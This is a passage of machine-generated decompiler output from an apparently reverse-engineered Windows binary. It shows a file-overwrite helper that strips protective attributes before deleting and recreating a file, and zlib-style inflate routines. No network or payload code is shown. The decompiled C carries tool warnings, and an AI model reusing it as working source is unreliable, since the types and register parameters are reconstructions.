  DWORD DVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  LPCWSTR unaff_ESI;
  
  DVar1 = GetFileAttributesW(unaff_ESI);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesW(unaff_ESI);
    if (DVar1 != 0xffffffff) {
      if ((DVar1 & 1) != 0) {
        DVar1 = DVar1 ^ 1;
      }
      if ((DVar1 & 4) != 0) {
        DVar1 = DVar1 ^ 4;
      }
      if ((DVar1 & 2) != 0) {
        DVar1 = DVar1 ^ 2;
      }
      if ((DVar1 & 0x20) != 0) {
        DVar1 = DVar1 ^ 0x20;
      }
      SetFileAttributesW(unaff_ESI,DVar1);
      BVar2 = DeleteFileW(unaff_ESI);
      GetLastError();
      if (BVar2 != 0) goto LAB_00404e53;
    }
    return (HANDLE)0xffffffff;
  }
LAB_00404e53:
  pvVar3 = CreateFileW(unaff_ESI,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



void __fastcall FUN_00404e70(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x14,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00404e90(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



void __fastcall FUN_00404eb0(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x10,param_3,&stack0x00000008);
  return;
}



int __cdecl FUN_00404ed0(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_EBX;
  void *_Src;
  int unaff_ESI;
  void *pvVar3;
  uint uVar4;
  void *local_4;
  
  local_4 = *(void **)(unaff_EBX + 0xc);
  _Src = *(void **)(unaff_ESI + 0x30);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  if (pvVar3 < _Src) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar4 = (int)pvVar3 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar3 - (int)_Src)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    _memcpy(local_4,_Src,uVar4);
    local_4 = (void *)((int)local_4 + uVar4);
    _Src = (void *)((int)_Src + uVar4);
  }
  if (_Src == *(void **)(unaff_ESI + 0x2c)) {
    _Src = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = _Src;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)_Src;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      _memcpy(local_4,_Src,uVar4);
      local_4 = (void *)((int)local_4 + uVar4);
      _Src = (void *)((int)_Src + uVar4);
    }
  }
  *(void **)(unaff_EBX + 0xc) = local_4;
  *(void **)(unaff_ESI + 0x30) = _Src;
  return param_1;
}



void __cdecl FUN_00404fc0(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __thiscall FUN_00405000(void *this,int param_1)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  undefined *puVar4;
  byte **in_EAX;
  uint uVar5;
  undefined *puVar6;
  undefined *puVar7;
  byte *pbVar8;
  uint uVar9;
  uint local_1c;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  local_1c = *(uint *)((int)this + 0x20);
  piVar2 = *(int **)((int)this + 4);
  local_14 = in_EAX[1];
  pbVar8 = *in_EAX;
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar9 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  iVar3 = *piVar2;
  do {
    puVar6 = puVar7;
    switch(iVar3) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_004050f0:
        piVar2[3] = (uint)*(byte *)(piVar2 + 4);
        piVar2[2] = piVar2[5];
        *piVar2 = 1;
        goto switchD_00405048_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_004068d0((uint)*(byte *)(piVar2 + 4),(uint)*(byte *)((int)piVar2 + 0x11),
                             piVar2[5],piVar2[6],(int)this,in_EAX);
      local_14 = in_EAX[1];
      local_1c = *(uint *)((int)this + 0x20);
      pbVar8 = *in_EAX;
      uVar9 = *(uint *)((int)this + 0x1c);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_004050f0;
      *piVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_00405537;
    case 1:
switchD_00405048_caseD_1:
      for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) {
LAB_00405575:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = (byte *)0x0;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          *in_EAX = pbVar8;
          *(undefined **)((int)this + 0x34) = puVar7;
          FUN_00404ed0(param_1);
          return;
        }
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041e160 + piVar2[3] * 4) & local_1c) * 8);
      local_1c = local_1c >> (local_c[1] & 0x1f);
      uVar9 = uVar9 - local_c[1];
      bVar1 = *local_c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        piVar2[2] = *(int *)(local_c + 4);
        *piVar2 = 6;
        goto LAB_00405537;
      }
      if ((bVar1 & 0x10) != 0) {
        piVar2[2] = uVar5 & 0xf;
        piVar2[1] = *(int *)(local_c + 4);
        *piVar2 = 2;
        goto LAB_00405537;
      }
      if ((bVar1 & 0x40) == 0) goto LAB_004051c3;
      if ((bVar1 & 0x20) != 0) {
        *piVar2 = 7;
        goto LAB_00405537;
      }
      *piVar2 = 9;
      in_EAX[6] = (byte *)s_invalid_literal_length_code_0041e1a4;
      param_1 = -3;
      goto LAB_00405548;
    case 2:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00405575;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[1] = piVar2[1] + (*(uint *)(&DAT_0041e160 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      piVar2[3] = (uint)*(byte *)((int)piVar2 + 0x11);
      piVar2[2] = piVar2[6];
      *piVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00405575;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[3] = piVar2[3] + (*(uint *)(&DAT_0041e160 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      *piVar2 = 5;
    case 5:
      local_8 = puVar7 + -piVar2[3];
      if (local_8 < *(undefined **)((int)this + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_8 < *(undefined **)((int)this + 0x28));
      }
      iVar3 = piVar2[1];
      while (iVar3 != 0) {
        puVar6 = puVar7;
        if (local_10 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_10 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_10 != puVar6) {
              if (puVar6 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar6);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_10 != (undefined *)0x0) goto LAB_0040544d;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_00404ed0(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar4 = *(undefined **)((int)this + 0x30);
            if (puVar4 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar4) {
                local_10 = puVar4 + (-1 - (int)puVar7);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_004055b8;
        }
LAB_0040544d:
        *puVar6 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_8 == *(undefined **)((int)this + 0x2c)) {
          local_8 = *(undefined **)((int)this + 0x28);
        }
        piVar2[1] = piVar2[1] + -1;
        iVar3 = piVar2[1];
      }
LAB_00405531:
      *piVar2 = 0;
      goto LAB_00405537;
    case 6:
      if (local_10 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_10 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_10 != puVar6) {
            if (puVar6 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar6);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_10 != (undefined *)0x0) goto LAB_00405516;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_00404ed0(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar4 = *(undefined **)((int)this + 0x30);
          if (puVar4 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar4) {
              local_10 = puVar4 + (-1 - (int)puVar7);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_004055b8:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = local_14;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          goto LAB_00405560;
        }
      }
LAB_00405516:
      *puVar6 = *(undefined *)(piVar2 + 2);
      puVar7 = puVar6 + 1;
      local_10 = local_10 + -1;
      param_1 = 0;
      goto LAB_00405531;
    case 7:
      if (7 < uVar9) {
        local_14 = local_14 + 1;
        uVar9 = uVar9 - 8;
        pbVar8 = pbVar8 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00404ed0(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) == puVar7) {
        *piVar2 = 8;
switchD_00405048_caseD_8:
        param_1 = 1;
LAB_00405548:
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      else {
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      puVar6 = puVar7;
LAB_00405560:
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar6;
      FUN_00404ed0(param_1);
      return;
    case 8:
      goto switchD_00405048_caseD_8;
    case 9:
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      param_1 = -3;
      goto LAB_00405560;
    default:
      param_1 = -2;
      goto LAB_00405548;
    }
    for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00405575;
      bVar1 = *pbVar8;
      local_14 = local_14 + -1;
      pbVar8 = pbVar8 + 1;
      param_1 = 0;
      local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
    }
    local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041e160 + piVar2[3] * 4) & local_1c) * 8);
    local_1c = local_1c >> (local_c[1] & 0x1f);
    bVar1 = *local_c;
    uVar5 = (uint)bVar1;
    uVar9 = uVar9 - local_c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *piVar2 = 9;
        in_EAX[6] = (byte *)s_invalid_distance_code_0041f2c0;
        param_1 = -3;
        goto LAB_00405548;
      }
LAB_004051c3:
      piVar2[3] = uVar5;
      piVar2[2] = (int)(local_c + *(int *)(local_c + 4) * 8);
    }
    else {
      piVar2[2] = uVar5 & 0xf;
      piVar2[3] = *(int *)(local_c + 4);
      *piVar2 = 4;
    }
LAB_00405537:
    iVar3 = *piVar2;
  } while( true );
}



void FUN_00405670(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_004056e0(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00405670();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __thiscall FUN_00405780(void *this,int param_1)

{
  int *piVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  int iVar9;
  byte bVar10;
  uint uVar11;
  byte *_Src;
  uint uVar12;
  uint local_28;
  byte *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;
  int local_4;
  
  pbVar3 = *(byte **)((int)this + 0x34);
  local_20 = in_EAX[1];
  _Src = *in_EAX;
  uVar12 = *(uint *)((int)this + 0x1c);
  if (pbVar3 < *(byte **)((int)this + 0x30)) {
    local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)pbVar3);
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar3);
  }
                    // WARNING: Load size is inaccurate
  uVar11 = *this;
  uVar6 = *(uint *)((int)this + 0x20);
  uVar5 = *(uint *)((int)this + 0x20);
  do {
    local_28 = uVar5;
    local_24 = pbVar3;
    if (9 < uVar11) {
      param_1 = -2;
LAB_004057cf:
      *(uint *)((int)this + 0x20) = local_28;
LAB_004057d6:
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
LAB_004057e0:
      pbVar3 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
      *(byte **)((int)this + 0x34) = local_24;
      FUN_00404ed0(param_1);
      return;
    }
    switch((&switchD_00405804::switchdataD_0040616c)[uVar11]) {
    case (undefined *)0x40580b:
      iVar9 = param_1;
      for (; uVar5 = uVar6, uVar12 < 3; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = (byte *)0x0;
          goto LAB_00405ebf;
        }
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        local_28 = uVar5 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        uVar6 = local_28;
        iVar9 = param_1;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      param_1 = iVar9;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar11 = uVar12 - 3 & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar11;
        uVar12 = (uVar12 - 3) - uVar11;
        *(undefined4 *)this = 1;
        local_28 = uVar5;
        break;
      case 1:
        iVar9 = FUN_00404fc0(9,5,&DAT_0041e1c0,&DAT_0041f1c0);
        *(int *)((int)this + 4) = iVar9;
        if (iVar9 == 0) {
          param_1 = -4;
          goto LAB_004057cf;
        }
        uVar5 = local_28 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 6;
        local_28 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 3;
        local_28 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_block_type_0041f324;
        *(uint *)((int)this + 0x20) = local_28 >> 3;
        uVar12 = uVar12 - 3;
        param_1 = -3;
        goto LAB_004057d6;
      }
      break;
    case (undefined *)0x4058c6:
      for (; uVar12 < 0x20; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00405f08;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      uVar11 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar11) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_stored_block_lengths_0041f338;
        goto switchD_00405804_caseD_405f30;
      }
      uVar5 = 0;
      uVar12 = 0;
      *(uint *)((int)this + 4) = uVar11;
      local_28 = 0;
      if (uVar11 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case (undefined *)0x40593a:
      if (local_20 == (byte *)0x0) {
LAB_00405f63:
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = (byte *)0x0;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404ed0(param_1);
        return;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (pbVar3 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x30);
          local_24 = *(byte **)((int)this + 0x28);
          if (local_24 != pbVar4) {
            if (local_24 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)local_24);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)local_24;
            }
            pbVar3 = local_24;
            if (local_18 != (byte *)0x0) goto LAB_004059e7;
          }
        }
        local_24 = pbVar3;
        *(byte **)((int)this + 0x34) = local_24;
        iVar9 = FUN_00404ed0(param_1);
        pbVar3 = *(byte **)((int)this + 0x30);
        local_24 = *(byte **)((int)this + 0x34);
        if (local_24 < pbVar3) {
          local_18 = pbVar3 + (-1 - (int)local_24);
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
        }
        if (local_24 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x28);
          if (pbVar4 != pbVar3) {
            local_24 = pbVar4;
            if (pbVar4 < pbVar3) {
              local_18 = pbVar3 + (-1 - (int)pbVar4);
            }
            else {
              local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar4);
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = uVar5;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          goto LAB_00405ebf;
        }
      }
LAB_004059e7:
      param_1 = 0;
      local_1c = *(byte **)((int)this + 4);
      if (local_20 < *(byte **)((int)this + 4)) {
        local_1c = local_20;
      }
      if (local_18 < local_1c) {
        local_1c = local_18;
      }
      _memcpy(local_24,_Src,(size_t)local_1c);
      local_20 = local_20 + -(int)local_1c;
      local_24 = local_24 + (int)local_1c;
      local_18 = local_18 + -(int)local_1c;
      _Src = _Src + (int)local_1c;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case (undefined *)0x405a4f:
      for (; uVar12 < 0xe; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00405f63;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar11 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar11)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_too_many_length_or_distance_symb_0041f358;
        goto switchD_00405804_caseD_405f30;
      }
      iVar9 = (*(code *)in_EAX[8])(in_EAX[10],uVar11 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar9;
      if (iVar9 == 0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404ed0(-4);
        return;
      }
      uVar6 = local_28 >> 0xe;
      uVar12 = uVar12 - 0xe;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 4;
      local_28 = uVar6;
    case (undefined *)0x405ae1:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; uVar12 < 3; uVar12 = uVar12 + 8) {
            if (local_20 == (byte *)0x0) goto LAB_00405f63;
            bVar2 = *_Src;
            local_20 = local_20 + -1;
            _Src = _Src + 1;
            param_1 = 0;
            local_28 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
            uVar6 = local_28;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_0041f2d8 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_28 = local_28 >> 3;
          uVar12 = uVar12 - 3;
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar11 = *(uint *)((int)this + 8);
      while (uVar11 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_0041f2d8 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar11 = *(uint *)((int)this + 8);
      }
      *(int *)((int)this + 0x10) = 7;
      iVar9 = FUN_004066b0(*(void **)((int)this + 0xc),(int *)((int)this + 0x10),
                           (int *)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
LAB_00405ebf:
        pbVar3 = *in_EAX;
        *in_EAX = _Src;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
        *(byte **)((int)this + 0x34) = local_24;
        FUN_00404ed0(iVar9);
        return;
      }
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 5;
      uVar6 = local_28;
switchD_00405804_caseD_405bb4:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          uVar11 = *(uint *)((int)this + 0x10);
          if (uVar12 < uVar11) {
            do {
              if (local_20 == (byte *)0x0) goto LAB_00405f63;
              bVar2 = *_Src;
              local_20 = local_20 + -1;
              bVar10 = (byte)uVar12;
              uVar11 = *(uint *)((int)this + 0x10);
              uVar12 = uVar12 + 8;
              _Src = _Src + 1;
              uVar6 = uVar6 | (uint)bVar2 << (bVar10 & 0x1f);
              param_1 = 0;
              local_28 = uVar6;
            } while (uVar12 < uVar11);
          }
          iVar9 = *(int *)((int)this + 0x14) + (*(uint *)(&DAT_0041e160 + uVar11 * 4) & uVar6) * 8;
          bVar2 = *(byte *)(iVar9 + 1);
          uVar11 = (uint)bVar2;
          local_c = *(uint *)(iVar9 + 4);
          if (local_c < 0x10) {
            local_28 = uVar6 >> (bVar2 & 0x1f);
            uVar12 = uVar12 - uVar11;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_c;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_c == 0x12) {
              local_14 = 7;
            }
            else {
